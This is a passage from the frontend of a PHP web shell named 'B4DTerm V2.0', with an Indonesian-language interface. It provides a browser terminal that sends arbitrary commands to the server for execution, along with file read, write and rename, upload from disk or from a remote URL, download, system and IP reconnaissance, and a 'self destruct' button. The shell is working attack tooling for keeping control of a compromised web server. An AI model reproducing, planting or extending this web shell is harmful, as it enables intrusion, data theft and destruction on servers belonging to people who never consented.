            <button onclick="tg()" class="px-3 py-2 bg-emerald-900/30 hover:bg-emerald-900/50 border border-emerald-500/30 rounded text-emerald-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-upload w-3"></i><span>Upload</span></button>
            
            <!-- System & Info -->
            <button onclick="x('id; uname -a; pwd')" class="px-3 py-2 bg-orange-900/30 hover:bg-orange-900/50 border border-orange-500/30 rounded text-orange-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-info-circle w-3"></i><span>Info</span></button>
            <button onclick="showIpInfo()" class="px-3 py-2 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30 rounded text-purple-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-network-wired w-3"></i><span>IP Info</span></button>
            <button onclick="x('help')" class="px-3 py-2 bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-500/30 rounded text-yellow-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-question-circle w-3"></i><span>Help</span></button>
            <button onclick="if(confirm('Hancurkan sistem?'))x('self_destruct')" class="px-3 py-2 bg-red-900/30 hover:bg-red-900/50 border border-red-500/30 rounded text-red-400 text-xs whitespace-nowrap flex items-center gap-1"><i class="fas fa-skull w-3"></i><span>Hancurkan</span></button>
        </div>

        <!-- Pilihan 2: Breadcrumb dengan Folder Steps -->
        <div class="p-3 g rounded-b-xl">
            <div class="flex justify-between items-center text-[10px] text-gray-500 mb-2 px-1 gap-2">
                <!-- Breadcrumb dengan Folder Steps -->
                <div class="flex items-center gap-1 overflow-x-auto breadcrumb-container flex-1 min-w-0 py-1">
                    <div id="wd" class="flex items-center gap-1 breadcrumb-text">
                        <?php echo render_breadcrumb($_SESSION['d']); ?>
                    </div>
                </div>
                
                <!-- PHP Version Compact -->
                <div class="php-badge px-2 py-1 rounded-lg flex items-center gap-1 flex-shrink-0 group hover:bg-neutral-800/80 transition-colors php-version">
                    <i class="fab fa-php text-purple-300 text-xs"></i>
                    <span class="text-gray-200 text-xs font-semibold group-hover:text-white transition-colors">
                        <?= substr(phpversion(), 0, 5) ?>
                    </span>
                </div>
            </div>
            <div class="relative">
                <span class="absolute left-3 top-2 text-emerald-500 font-bold">$</span>
                <input id="ci" class="w-full bg-neutral-900 border border-emerald-500/30 rounded pl-6 pr-10 py-2 focus:outline-none focus:border-emerald-500 text-gray-200 placeholder-gray-500 text-sm transition-colors" autocomplete="off" spellcheck="false" placeholder="command...">
                <button id="sb" class="absolute right-2 top-2 text-emerald-500 hover:text-emerald-300 transition font-bold"><i class="fas fa-play"></i></button>
            </div>
        </div>
    </footer>
</div>

<script>
const O=document.getElementById('out'), I=document.getElementById('ci'), W=document.getElementById('wd'), S=document.getElementById('status');
const tg=()=>document.getElementById('up').classList.toggle('hidden');
const probeMethod = '<?= $probe ?>';
let isFirstCmd = true;

let history = [];
let histIdx = -1;

const helpText = `
B4DTerm V2.0 (© Pawline):

Quick Action:
📁 List      - Lihat file dan direktori
📂 Folder    - Buat folder baru
📄 File      - Buat file baru  
✏️ Ganti Nama - Ubah nama file/folder
📝 Edit      - Edit konten file
📥 Download  - Download file
📤 Upload    - Upload file atau dari URL
🖥️ Info      - Informasi sistem
🌐 IP Info   - Tampilkan IP & server
❓ Bantuan   - Tampilkan panduan ini
💀 Hancurkan - Self Destruct!
`;

// ===== MODAL FUNCTIONS =====

// CREATE FOLDER
const openCreateFolderModal = () => {
    document.getElementById('createFolderModal').classList.remove('hidden');
    document.getElementById('folderNameInput').value = 'new_folder';
    document.getElementById('folderNameInput').select();
    document.getElementById('folderNameInput').focus();
};

const closeCreateFolderModal = () => {
    document.getElementById('createFolderModal').classList.add('hidden');
    document.getElementById('folderNameInput').value = '';
};

const createFolderSubmit = () => {
    const folderName = document.getElementById('folderNameInput').value.trim();
    if (!folderName) {
        alert('Nama folder diperlukan!');
        return;
    }
    closeCreateFolderModal();
    x('mkdir ' + folderName);
};

// CREATE FILE
const openCreateFileModal = () => {
    document.getElementById('createFileModal').classList.remove('hidden');
    document.getElementById('fileNameInput').value = 'new_file.txt';
    document.getElementById('fileNameInput').select();
    document.getElementById('fileNameInput').focus();
};

const closeCreateFileModal = () => {
    document.getElementById('createFileModal').classList.add('hidden');
    document.getElementById('fileNameInput').value = '';
    document.getElementById('fileContentInput').value = '';
};

const createFileSubmit = () => {
    const fileName = document.getElementById('fileNameInput').value.trim();
    if (!fileName) {
        alert('Nama file diperlukan!');
        return;
    }
    
    const content = document.getElementById('fileContentInput').value;
    closeCreateFileModal();
    
    // Buat file dulu
    x('touch ' + fileName);
    
    // Jika ada konten, tambahkan setelah file dibuat
    if (content.trim() !== '') {
        setTimeout(() => {
            const formData = new FormData();
            formData.append('writefile', fileName);
            formData.append('content', content);
            
            fetch('', {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(result => {
                  if (result.success) {
                      lg(`File "${fileName}" berhasil dibuat dengan konten`, 0, 0);
                  }
              });
        }, 500);
    }
};

// RENAME
const openRenameModal = () => {
    document.getElementById('renameModal').classList.remove('hidden');
    document.getElementById('renameOldName').value = '';
    document.getElementById('renameNewName').value = '';
};

const closeRenameModal = () => {
    document.getElementById('renameModal').classList.add('hidden');
    document.getElementById('renameOldName').value = '';
    document.getElementById('renameNewName').value = '';
};

const selectFileForRename = (fileName) => {
    document.getElementById('renameOldName').value = fileName;
    document.getElementById('renameNewName').value = fileName;
    document.getElementById('renameNewName').select();
    document.getElementById('renameNewName').focus();
};

const renameSubmit = () => {
    const oldName = document.getElementById('renameOldName').value.trim();
    const newName = document.getElementById('renameNewName').value.trim();
    
    if (!oldName) {
        alert('Pilih file/folder terlebih dahulu!');
        return;
    }
    
    if (!newName) {
        alert('Nama baru diperlukan!');
        return;
    }
    
    if (oldName === newName) {
        alert('Nama baru harus berbeda dari nama lama!');
        return;
    }
    
    closeRenameModal();
    x('mv "' + oldName + '" "' + newName + '"');
};

// EDIT
const openEditModal = () => {
    document.getElementById('editModal').classList.remove('hidden');
    document.getElementById('editFileName').value = '';
    document.getElementById('editFileContent').value = '';
};

const closeEditModal = () => {
    document.getElementById('editModal').classList.add('hidden');
    document.getElementById('editFileName').value = '';
    document.getElementById('editFileContent').value = '';
};

const selectFileForEdit = async (fileName) => {
    document.getElementById('editFileName').value = fileName;
    
    try {
        const formData = new FormData();
        formData.append('readfile', fileName);
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            document.getElementById('editFileContent').value = result.content;
            document.getElementById('editFileContent').focus();
        } else {
            alert('Gagal membaca file: ' + (result.error || 'Error tidak diketahui'));
        }
    } catch (error) {
        alert('Error membaca file');
    }
};

const saveFile = async () => {
    const fileName = document.getElementById('editFileName').value.trim();
    const content = document.getElementById('editFileContent').value;
    
    if (!fileName) {
        alert('Pilih file terlebih dahulu!');
        return;
    }

    try {
        const formData = new FormData();
        formData.append('writefile', fileName);
        formData.append('content', content);
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            lg(`File "${fileName}" berhasil disimpan`, 0, 0);
            closeEditModal();
        } else {
            alert('Gagal menyimpan file: ' + (result.error || 'Error tidak diketahui'));
        }
    } catch (error) {
        alert('Error menyimpan file');
    }
};

// ===== URL UPLOAD =====
const openUrlUploadModal = () => {
    document.getElementById('urlUploadModal').classList.remove('hidden');
    document.getElementById('urlInput').focus();
};

const closeUrlUploadModal = () => {
    document.getElementById('urlUploadModal').classList.add('hidden');
    document.getElementById('urlInput').value = '';
    document.getElementById('urlFilename').value = '';
};

const startUrlUpload = async () => {
    const url = document.getElementById('urlInput').value.trim();
    const filename = document.getElementById('urlFilename').value.trim();
    
    if (!url) {
        alert('URL diperlukan!');
        return;
    }

    try {
        const formData = new FormData();
        formData.append('url_upload', '1');
        formData.append('url', url);
        if (filename) {
            formData.append('url_filename', filename);
        }
        
        lg(`Mendownload dari URL: ${url}`, 1);
        closeUrlUploadModal();
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            lg(`Download berhasil: ${result.path} (${result.size} bytes)`, 0, 0);
        } else {
            lg(`Download gagal: ${result.error}`, 0, 1);
        }
    } catch (error) {
        lg('Error downloading dari URL', 0, 1);
    }
};

// ===== CUSTOM DOWNLOAD =====
const openDownloadModal = () => {
    document.getElementById('downloadModal').classList.remove('hidden');
    document.getElementById('downloadFile').focus();
};

const closeDownloadModal = () => {
    document.getElementById('downloadModal').classList.add('hidden');
    document.getElementById('downloadFile').value = '';
    document.getElementById('downloadAs').value = '';
};

const startCustomDownload = () => {
    const file = document.getElementById('downloadFile').value.trim();
    const saveAs = document.getElementById('downloadAs').value.trim();
    
    if (!file) {
        alert('Nama file diperlukan!');
        return;
    }
    
    const filename = saveAs || file;
    closeDownloadModal();
    window.location = `?get=${encodeURIComponent(file)}&saveas=${encodeURIComponent(filename)}`;
};

// ===== IP INFO =====
const showIpInfo = async () => {
    document.getElementById('ipModal').classList.remove('hidden');
    
    try {
        const formData = new FormData();
        formData.append('get_ip_info', '1');
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.success) {
            document.getElementById('clientIp').textContent = result.client_ip;
            document.getElementById('serverIp').textContent = result.server_ip;
            document.getElementById('hostname').textContent = result.hostname;
        } else {
            document.getElementById('clientIp').textContent = 'Error memuat info IP';
            document.getElementById('serverIp').textContent = 'Error memuat info IP';
            document.getElementById('hostname').textContent = 'Error memuat hostname';
        }
    } catch (error) {
        document.getElementById('clientIp').textContent = 'Error jaringan';
        document.getElementById('serverIp').textContent = 'Error jaringan';
        document.getElementById('hostname').textContent = 'Error jaringan';
    }
};

const closeIpModal = () => {
    document.getElementById('ipModal').classList.add('hidden');
};

// ===== CORE FUNCTIONS =====
const typeWriter = (text, element, callback, speed = 25) => {
    let i = 0;
    element.innerHTML = '';
    function type() {
        if (i < text.length) {
            element.innerHTML += text.charAt(i);
            i++;
            setTimeout(type, speed);
        } else if (callback) {
            callback();
        }
    }
    type();
};

const animateLoad = () => {
    typeWriter("Menghubungkan ke sistem...", S, () => {
        S.innerHTML = 'Menghubungkan ke sistem... [ <span class="text-white">OK</span> ]';
        const d2 = document.createElement('div');
        d2.className = 'text-emerald-500 font-semibold text-xs mb-4 mt-2';
        O.appendChild(d2);
        typeWriter(`B4DTerm V2.0`, d2, () => {
            I.focus();
        }, 30);
    }, 40);
};

const lg = (t, m, e=0, type='norm') => {
    const d=document.createElement('div');
    if(m){
        d.innerHTML=`<div class="text-[10px] text-gray-600 mt-2">pawline@b4dterm.host</div><div class="flex gap-2"><span class="text-emerald-500">$</span><span class="text-white">${t}</span></div>`;
    } else {
        d.className = `pl-3 border-l-2 ${e?'border-red-500 text-red-400':'border-white/20 text-gray-300'} whitespace-pre overflow-x-auto py-1 text-[11px] leading-snug`;
        d.innerText = t;
    }
    O.appendChild(d);
    O.scrollTop=O.scrollHeight;
}

const x = async(c) => {
    if(!c) c=I.value; if(!c) return;
    
    if (c !== 'clear' && c !== 'help' && !c.startsWith('dl ') && history[history.length - 1] !== c) {
        history.push(c);
    }
    histIdx = history.length;
    
    if(c=='clear'){ O.innerHTML=''; lg('PID: <?= getmypid() ?>',0,0,'pid'); animateLoad(); I.value=''; return; }
    if (c === 'help') {
        lg(c, 1);
        lg(helpText, 0, 0); 
        I.value = ''; I.focus(); return;
    }
    if(c.startsWith('dl ')){ 
        const file = c.substring(3);
        const saveAs = prompt('Simpan sebagai (opsional):', file);
        if (saveAs !== null) {
            window.location = `?get=${encodeURIComponent(file)}&saveas=${encodeURIComponent(saveAs || file)}`;
        }
        I.value=''; return; 
    }
    
    lg(c,1); I.value=''; I.disabled=1;
    
    try {
        const f=new FormData(); f.append('k',c);
        const r=await fetch('',{method:'POST',body:f}).then(res=>res.json());
        
        if(r.o && r.o.trim() !== '') {
            lg(r.o,0,r.e);
        } else if (r.s && !r.e) {
            lg("Command berhasil dieksekusi (tidak ada output)", 0, 0);
        } else if (r.e) {
            lg("Command gagal dieksekusi", 0, 1);
        } else {
            lg("Tidak ada output dari command", 0, 0);
        }

        // Update breadcrumb jika ada perubahan directory
        if(r.d && W) {
            W.innerHTML = r.d.split('/').map((part, index, parts) => {
                if (part === '') return '';
                let html = '';
                if (index > 0) {
                    html += '<span class="text-gray-600 mx-1"><i class="fas fa-chevron-right text-[8px]"></i></span>';
                }
                
                if (index === 0 && part === 'home') {
                    html += '<span class="text-emerald-300 hover:text-emerald-200 transition-colors flex items-center gap-1">';
                    html += '<i class="fas fa-home text-xs"></i>';
                    html += '<span>' + part + '</span>';
                    html += '</span>';
                } else {
                    html += '<span class="text-emerald-300 hover:text-emerald-200 transition-colors">' + part + '</span>';
                }
                return html;
            }).join('');
        }

        if (isFirstCmd && r.m && r.m !== 'none') {
            const m_d = document.createElement('div');
            m_d.className = 'text-emerald-500 text-[10px] pl-3 mb-2 font-semibold';
            O.appendChild(m_d);
            typeWriter(`Metode Eksekusi: ${r.m} Diaktifkan`, m_d);
            isFirstCmd = false;
        }

    } catch(e){ lg('Request Gagal: ' + e.message,0,1); }
    I.disabled=0; I.focus();
}

document.getElementById('sb').onclick=()=>x();

I.onkeydown=e=>{
    if(e.key=='Enter') x();
    else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (histIdx > 0) I.value = history[--histIdx];
    }
    else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (histIdx < history.length - 1) I.value = history[++histIdx];
        else { histIdx = history.length; I.value = ''; }
    }
};

document.getElementById('ub').onclick=async()=>{
    const f=document.getElementById('fi').files[0];
    if(!f) return;
    const d=new FormData(); d.append('f',f);
    
    const originalText = document.getElementById('ub').innerText;
    document.getElementById('ub').innerText = '...';
    document.getElementById('ub').disabled = true;

    try {
        const r=await fetch('',{method:'POST',body:d}).then(res=>res.json());
        if (r.s && r.path) {
            lg(`Upload Berhasil: ${f.name} => ${r.path}`, 0);
        } else {
            lg(`Upload Gagal. Cek permissions.`, 0, 1);
        }
    } catch(e) {
        lg('Error Jaringan Upload', 0, 1);
    } finally {
        document.getElementById('ub').innerText = originalText;
        document.getElementById('ub').disabled = false;
        tg();
    }
};

window.onload = () => animateLoad();
</script>
</body>
</html>